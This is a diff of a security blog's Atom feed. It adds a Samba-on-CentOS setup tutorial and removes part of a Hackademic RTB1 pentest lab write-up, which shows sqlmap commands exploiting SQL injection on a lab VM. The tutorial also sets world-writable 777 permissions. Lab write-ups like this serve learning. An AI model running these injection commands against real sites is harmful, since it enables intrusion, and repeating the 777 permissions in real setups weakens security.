@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-07T07:28:54-04:00</updated>
+  <updated>2017-06-09T06:24:50-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,568 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Quick shares with Samba on CentOS]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos/"/>
+    <updated>2017-06-09T05:47:05-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos</id>
+    <content type="html"><![CDATA[<p>The interwebz is thundering with doomsday predictions about the <a href="https://blog.qualys.com/securitylabs/2017/05/26/samba-vulnerability-cve-2017-7494">Samba CVE-2017-7494 exploit</a>, and here I am, deciding that now is the best time to make a post on setting up Samba shares! xD</p>
+
+<p>On a related note, if for some reason you can&rsquo;t patch the vulnerability yet, there is a workaround (with some drawbacks). Edit the global section in smb.conf and add the line <code>nt pipe support = no</code>.</p>
+
+<!-- more -->
+
+
+<p>Back to the matter at hand. First, let&rsquo;s verify if Samba is installed on the CentOS system:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
+</span><span class='line'>package samba is not installed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since it&rsquo;s not installed on my machine, I installed it with <code>yum install samba</code>, and then ran the previous command again, to check the version:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
+</span><span class='line'>samba-4.4.4-14.el7_3.x86_64</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, let&rsquo;s start Samba and see it running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>service smb start
+</span><span class='line'>Redirecting to /bin/systemctl start  smb.service
+</span><span class='line'>service smb status
+</span><span class='line'>Redirecting to /bin/systemctl status  smb.service
+</span><span class='line'>● smb.service - Samba SMB Daemon
+</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/smb.service; disabled; vendor preset: disabled)
+</span><span class='line'>   Active: active (running) since Thu 2017-06-08 10:56:54 EEST; 5s ago
+</span><span class='line'> Main PID: 61874 (smbd)
+</span><span class='line'>   Status: "smbd: ready to serve connections..."
+</span><span class='line'>   CGroup: /system.slice/smb.service
+</span><span class='line'>           ├─61874 /usr/sbin/smbd
+</span><span class='line'>           ├─61875 /usr/sbin/smbd
+</span><span class='line'>           ├─61876 /usr/sbin/smbd
+</span><span class='line'>           └─61879 /usr/sbin/smbd
+</span><span class='line'>
+</span><span class='line'>Jun 08 10:56:52 localhost.localdomain systemd[1]: Starting Samba SMB Daemon...
+</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]: [2017/06/08 10:56:54.513901,  0] ../lib/util/become_daemon.c:124(daemon_ready)
+</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]:   STATUS=daemon 'smbd' finished starting up and ready to serve connections
+</span><span class='line'>Jun 08 10:56:54 localhost.localdomain systemd[1]: Started Samba SMB Daemon.</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Samba daemons</h2>
+
+<p>The Samba functionality is contained within 3 daemons:</p>
+
+<ul>
+<li><p><strong>smbd</strong> &ndash; file sharing, printing services, authentication. Default ports are 139 and 445</p></li>
+<li><p><strong>nmbd</strong> &ndash; NetBIOS name service requests and browsing protocols</p></li>
+<li><p><strong>winbindd</strong> &ndash; used for Windows domains membership</p></li>
+</ul>
+
+
+<h2>Samba configuration</h2>
+
+<p>The Samba configuration file is <code>/etc/samba/smb.conf</code>. Here is how a fresh config file looks after installation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># See smb.conf.example for a more detailed config file or
+</span><span class='line'># read the smb.conf manpage.
+</span><span class='line'># Run 'testparm' to verify the config is correct after
+</span><span class='line'># you modified it.
+</span><span class='line'>
+</span><span class='line'>[global]
+</span><span class='line'>  workgroup = SAMBA
+</span><span class='line'>  security = user
+</span><span class='line'>
+</span><span class='line'>  passdb backend = tdbsam
+</span><span class='line'>
+</span><span class='line'>  printing = cups
+</span><span class='line'>  printcap name = cups
+</span><span class='line'>  load printers = yes
+</span><span class='line'>  cups options = raw
+</span><span class='line'>
+</span><span class='line'>[homes]
+</span><span class='line'>  comment = Home Directories
+</span><span class='line'>  valid users = %S, %D%w%S
+</span><span class='line'>  browseable = No
+</span><span class='line'>  read only = No
+</span><span class='line'>  inherit acls = Yes
+</span><span class='line'>
+</span><span class='line'>[printers]
+</span><span class='line'>  comment = All Printers
+</span><span class='line'>  path = /var/tmp
+</span><span class='line'>  printable = Yes
+</span><span class='line'>  create mask = 0600
+</span><span class='line'>  browseable = No
+</span><span class='line'>
+</span><span class='line'>[print$]
+</span><span class='line'>  comment = Printer Drivers
+</span><span class='line'>  path = /var/lib/samba/drivers
+</span><span class='line'>  write list = root
+</span><span class='line'>  create mask = 0664
+</span><span class='line'>  directory mask = 0775</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For much more detailed information and examples, see the <a href="http://chousensha.github.io/downloads/code/smb.conf.example">smb.conf.example file</a></p>
+
+<h2>Create Samba share</h2>
+
+<p>In this example, let&rsquo;s create a share that users can also write to. First, create the directory that you will share: <code>mkdir -p /srv/samba/myshare</code>. I placed a text file with some random stuff inside. Then I gave full access to the path and its subfolders with <code>chmod -R 777 /srv/samba</code></p>
+
+<p>Next, we need to create a Samba user, but this account is not the same as a user account on the system. We have to make a user account on the system before assigning it to Samba:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>adduser smbuser -s /sbin/nologin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here I created a user just for Samba, with no login shell. Attempting to login will give the user a message that they are not allowed to login. If you prefer that the user is disconnected with no message, you can specify <code>/bin/false</code> instead.</p>
+
+<p>Then, I gave the user account a description, which you can find inside <em>/etc/passwd</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>usermod -c 'Samba access is allowed for this user' smbuser
+</span><span class='line'>[root@localhost ~]# cat /etc/passwd | grep smbuser
+</span><span class='line'>smbuser:x:1001:1001:Samba access is allowed for this user:/home/smbuser:/sbin/nologin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Have to give the user account a password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# passwd smbuser
+</span><span class='line'>Changing password for user smbuser.
+</span><span class='line'>New password:
+</span><span class='line'>Retype new password:
+</span><span class='line'>passwd: all authentication tokens updated successfully.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, we create a Samba user, by using the previously created account:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# smbpasswd -a smbuser
+</span><span class='line'>New SMB password:
+</span><span class='line'>Retype new SMB password:
+</span><span class='line'>Added user smbuser.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To be safe, check that the Samba user was created:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# pdbedit -L
+</span><span class='line'>smbuser:1001:Samba access is allowed for this user</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have the share location and the user, now we need to edit the smb.conf file with the relevant information:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[global]
+</span><span class='line'>  # workgroup name or Windows NT domain name
+</span><span class='line'>  workgroup = SAMBA
+</span><span class='line'>  # default: user and password authentication
+</span><span class='line'>  security = user
+</span><span class='line'>  # optional comment for Windows
+</span><span class='line'>  server string = Samba File Server
+</span><span class='line'>  # default backend for user information
+</span><span class='line'>  passdb backend = tdbsam
+</span><span class='line'>
+</span><span class='line'>[sharename]
+</span><span class='line'>  path = /srv/samba/myshare
+</span><span class='line'>  comment = Only authorized users
+</span><span class='line'>  # allow these users
+</span><span class='line'>  valid users = smbuser
+</span><span class='line'>  # same can be achieved with writable = yes
+</span><span class='line'>  read only = no  
+</span><span class='line'>  # allow subnet range
+</span><span class='line'>  allow hosts = 192.168.217.
+</span><span class='line'>  # deny access
+</span><span class='line'>  invalid users = root  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used comments for easier understanding, but for performance reasons, you might want to keep your file to minimum size, by removing all those comment lines. You can do that by keeping a configuration file with all the additional remarks, while using a smb.conf with only the required configuration. All the comments will be stripped from the config file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost samba]# testparm -s smb.conf.old &gt; smb.conf
+</span><span class='line'>Load smb config files from smb.conf.old
+</span><span class='line'>rlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)
+</span><span class='line'>Processing section "[sharename]"
+</span><span class='line'>Loaded services file OK.
+</span><span class='line'>Server role: ROLE_STANDALONE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We checked that our config file is valid, so now it&rsquo;s time to test it. Restart Samba for the configurations to take effect with <code>service smb restart</code>. And now let&rsquo;s access the share! From another machine, I used <strong>smbclient</strong> to list the available services on the Samba server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient -L 192.168.217.131 -U smbuser
+</span><span class='line'>WARNING: The "syslog" option is deprecated
+</span><span class='line'>Enter smbuser's password:
+</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
+</span><span class='line'>
+</span><span class='line'>  Sharename       Type      Comment
+</span><span class='line'>  ---------       ----      -------
+</span><span class='line'>  sharename       Disk      Only authorized users
+</span><span class='line'>  IPC$            IPC       IPC Service (Samba File Server)
+</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
+</span><span class='line'>
+</span><span class='line'>  Server               Comment
+</span><span class='line'>  ---------            -------
+</span><span class='line'>
+</span><span class='line'>  Workgroup            Master
+</span><span class='line'>  ---------            -------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is one last step that you need to accomplish if you have SELinux enabled. You have to label the directory you&rsquo;re sharing with the <strong>samba_share_t</strong> label:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>chcon -R -t samba_share_t /srv/samba</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now the /srv/samba directory and everything it contains is labeled correctly, and SELinux won&rsquo;t interfere. View the security context of the path with:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -ldZ /srv/samba/
+</span><span class='line'>drwxr-xr-x. root root unconfined_u:object_r:samba_share_t:s0 /srv/samba/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Changes made with chcon are temporary. To survive a relabel or running <em>restorerecon</em>, make the changes permanent with:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>semanage fcontext -a -t samba_share_t "path(/.*)?"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then apply them with <code>restorecon -R -v /path</code>.</p>
+
+<p>Finally, to connect to a share, use the syntax: <code>smbclient  //host/sharename -U username</code> (in the below examle, the name of my share is sharename, because laziness):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient  //192.168.217.131/sharename -U smbuser
+</span><span class='line'>WARNING: The "syslog" option is deprecated
+</span><span class='line'>Enter smbuser's password:
+</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
+</span><span class='line'>smb: \&gt; ls
+</span><span class='line'>      .                                   D        0  Thu Jun  8 09:39:42 2017
+</span><span class='line'>      ..                                  D        0  Thu Jun  8 09:26:38 2017
+</span><span class='line'>      read.txt                            N       11  Thu Jun  8 09:39:42 2017
+</span><span class='line'>
+</span><span class='line'>          18307072 blocks of size 1024. 13091600 blocks available</span></code></pre></td></tr></table></div></figure>
+
+
+<p>List available commands:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; ?
+</span><span class='line'>?              allinfo        altname        archive        backup         
+</span><span class='line'>blocksize      cancel         case_sensitive cd             chmod          
+</span><span class='line'>chown          close          del            dir            du             
+</span><span class='line'>echo           exit           get            getfacl        geteas         
+</span><span class='line'>hardlink       help           history        iosize         lcd            
+</span><span class='line'>link           lock           lowercase      ls             l              
+</span><span class='line'>mask           md             mget           mkdir          more           
+</span><span class='line'>mput           newer          notify         open           posix          
+</span><span class='line'>posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   
+</span><span class='line'>posix_whoami   print          prompt         put            pwd            
+</span><span class='line'>q              queue          quit           readlink       rd             
+</span><span class='line'>recurse        reget          rename         reput          rm             
+</span><span class='line'>rmdir          showacls       setea          setmode        scopy          
+</span><span class='line'>stat           symlink        tar            tarmode        timeout        
+</span><span class='line'>translate      unlock         volume         vuid           wdel           
+</span><span class='line'>logon          listconnect    showconnect    tcon           tdis           
+</span><span class='line'>tid            logoff         ..             !              </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Download file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; get read.txt
+</span><span class='line'>getting file \read.txt of size 11 as read.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Delete file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; del read.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Upload file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; put test.png
+</span><span class='line'>putting file test.png as \test.png (0.2 kb/s) (average 0.2 kb/s)
+</span><span class='line'>smb: \&gt; ls
+</span><span class='line'>  .                                   D        0  Thu Jun  8 13:24:14 2017
+</span><span class='line'>  ..                                  D        0  Thu Jun  8 09:26:38 2017
+</span><span class='line'>  test.png                            A       35  Thu Jun  8 13:22:09 2017
+</span><span class='line'>
+</span><span class='line'>      18307072 blocks of size 1024. 13091480 blocks available</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From a Windows system, you can run <code>\192.168.217.131\sharename</code> to connect to the share, or use the <em>net use</em> command.</p>
+
+<p>View shares:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use
+</span><span class='line'>New connections will be remembered.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Status       Local     Remote                    Network
+</span><span class='line'>
+</span><span class='line'>-------------------------------------------------------------------------------
+</span><span class='line'>OK                     \\192.168.217.131\sharename
+</span><span class='line'>                                                 Microsoft Windows Network
+</span><span class='line'>The command completed successfully.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Connect to shares:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use S: \\192.168.217.131\sharename
+</span><span class='line'>The command completed successfully.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>C:\Documents and Settings\admin&gt;s:
+</span><span class='line'>
+</span><span class='line'>S:\&gt;dir
+</span><span class='line'> Volume in drive S is sharename
+</span><span class='line'> Volume Serial Number is DCCC-194F
+</span><span class='line'>
+</span><span class='line'> Directory of S:\
+</span><span class='line'>
+</span><span class='line'>06/09/2017  02:24 AM    &lt;DIR&gt;          .
+</span><span class='line'>06/08/2017  10:26 PM    &lt;DIR&gt;          ..
+</span><span class='line'>06/09/2017  02:22 AM                35 test.png
+</span><span class='line'>               1 File(s)             35 bytes
+</span><span class='line'>               2 Dir(s)  13,405,708,288 bytes free</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Other useful options</h3>
+
+<p>You can drill down into the smb.conf file and customize it to your liking. Here are a few options:</p>
+
+<ul>
+<li><p>read list = user1, user2 &ndash; set read only users on a writable share</p></li>
+<li><p>write list = user1, user2 &ndash; set write access for users on a read only share</p></li>
+<li><p>deny hosts  = ip &ndash; deny access to the specified IPs</p></li>
+<li><p>hide unreadable = yes &ndash; don&rsquo;t let users see files they don&rsquo;t have access to</p></li>
+<li><p>browseable = no &ndash; hide shares from Windows network</p></li>
+</ul>
+
+
+<p>Key takeaways:</p>
+
+<ul>
+<li><p>server and share security levels are deprecated, so best to avoid them</p></li>
+<li><p>specifying a share in the smb.conf file is not enough. Ensure that you have created the path and gave it sufficient permissins</p></li>
+<li><p>Samba users need to already exist on the system</p></li>
+<li><p>you can have both a well documented config file and a minimal size one for performance, by using <code>testparm -s</code></p></li>
+<li><p>if you use SELinux, don&rsquo;t forget to label your share with <code>samba_share_t</code></p></li>
+</ul>
+
+
+<p>Learn more:</p>
+
+<ul>
+<li><p><a href="http://linux-training.be/linuxsrv.pdf">Samba section in Paul Cobbaut&rsquo;s Linux Servers course</a></p></li>
+<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smb.conf.5.html">smb.conf manpage</a> &ndash; The configuration file for the Samba suite</p></li>
+<li><p><a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-samba.html">CentOS Samba guide</a></p></li>
+<li><p><a href="smbpasswd%20-%20The%20Samba%20encrypted%20password%20file">smbpasswd man page</a> &ndash; The Samba encrypted password file</p></li>
+<li><p><a href="https://www.samba.org/samba/docs/man/manpages/pdbedit.8.html">pdbedit manpage</a> &ndash; manage the SAM database (Database of Samba Users)</p></li>
+<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/testparm.1.html">testparm manpage</a> &ndash; check an smb.conf configuration file for internal correctness</p></li>
+<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html">smbclient manpage</a> &ndash; ftp-like client to access SMB/CIFS resources on servers</p></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/ Nothing so needs reforming as other \
+</span><span class='line'>| people's habits.                    |
+</span><span class='line'>|                                     |
+</span><span class='line'>\ -- Mark Twain                       /
+</span><span class='line'> -------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[lbd - Kali Linux tools]]></title>
@@ -10656,260 +11218,6 @@ available, you can even conduct web app security checks just with Nmap!</p>
 </pre></td><td class='code'><pre><code class=''><span class='line'>/ You are only young once, but you can \
 </span><span class='line'>\ stay immature indefinitely.          /
 </span><span class='line'> --------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
-    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
-    <updated>2016-07-18T09:00:59-04:00</updated>
-    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
-    <content type="html"><![CDATA[<h1>Mission statement</h1>
-
-<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>
-
-<!-- more -->
-
-
-<h1>Recon</h1>
-
-<p>I started with a port scan of the target, but only the 80 port is open:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-web.png" title="hackademic" alt="hackademic website"></p>
-
-<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-sqli.png" title="sqli" alt="sql error"></p>
-
-<h1>Exploit</h1>
-
-<p>Next I enumerated the databases with Sqlmap:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
-</span><span class='line'>available databases [3]:
-</span><span class='line'>[*] information_schema
-</span><span class='line'>[*] mysql
-</span><span class='line'>[*] wordpress</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
-</span><span class='line'>Database: wordpress
-</span><span class='line'>[9 tables]
-</span><span class='line'>+-------------------+
-</span><span class='line'>| wp_categories     |
-</span><span class='line'>| wp_comments       |
-</span><span class='line'>| wp_linkcategories |
-</span><span class='line'>| wp_links          |
-</span><span class='line'>| wp_options        |
-</span><span class='line'>| wp_post2cat       |
-</span><span class='line'>| wp_postmeta       |
-</span><span class='line'>| wp_posts          |
-</span><span class='line'>| wp_users          |
-</span><span class='line'>+-------------------+</span></code></pre></td></tr></table></div></figure>
-
-
-<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
